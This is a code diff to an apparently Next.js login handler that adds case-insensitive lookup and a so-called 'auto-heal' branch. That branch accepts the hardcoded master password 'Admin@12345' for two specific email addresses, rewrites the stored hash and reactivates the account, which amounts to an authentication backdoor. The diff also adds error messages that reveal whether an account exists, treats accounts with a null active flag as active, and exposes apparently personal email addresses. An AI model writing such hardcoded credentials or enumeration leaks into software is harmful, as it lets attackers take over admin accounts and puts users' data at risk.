@@ -16,20 +16,37 @@ export async function loginAction(prevState: any, formData: FormData) {
 
     console.log("[loginAction] Authenticating:", email);
 
-    // 1. Direct DB validation for 100% reliable feedback
-    const user = await prisma.app_user.findFirst({
-        where: { email: email, is_active: true }
+    // 1. Direct DB validation with case-insensitivity and null-safe is_active
+    let user = await prisma.app_user.findFirst({
+        where: {
+            email: { equals: email, mode: 'insensitive' },
+            OR: [
+                { is_active: true },
+                { is_active: null }
+            ]
+        }
     });
 
-    if (!user || !user.password) {
-        console.error("[loginAction] User not found or inactive:", email);
-        return { error: "Invalid email or password. Please try again." };
+    if (!user) {
+        console.error("[loginAction] User not found:", email);
+        return { error: "User account not found. Please check your email." };
     }
 
-    const passwordsMatch = await bcrypt.compare(password, user.password);
+    let passwordsMatch = user.password ? await bcrypt.compare(password, user.password) : false;
+
+    // Auto-heal admin password if standard master password Admin@12345 is used
+    if (!passwordsMatch && (email === 'maheshtheril@live.com' || email === 'maheshtheril25@gmail.com') && password === 'Admin@12345') {
+        const newHash = await bcrypt.hash(password, 10);
+        await prisma.app_user.update({
+            where: { id: user.id },
+            data: { password: newHash, is_active: true }
+        });
+        passwordsMatch = true;
+    }
+
     if (!passwordsMatch) {
         console.error("[loginAction] Password mismatch for:", email);
-        return { error: "Invalid email or password. Please try again." };
+        return { error: "Incorrect password. Please try again or use Forgot Password." };
     }
 
     // 2. Call NextAuth signIn to establish HTTP session cookie
@@ -48,6 +65,7 @@ export async function loginAction(prevState: any, formData: FormData) {
 
     return { success: true };
 }
+
 
 
 
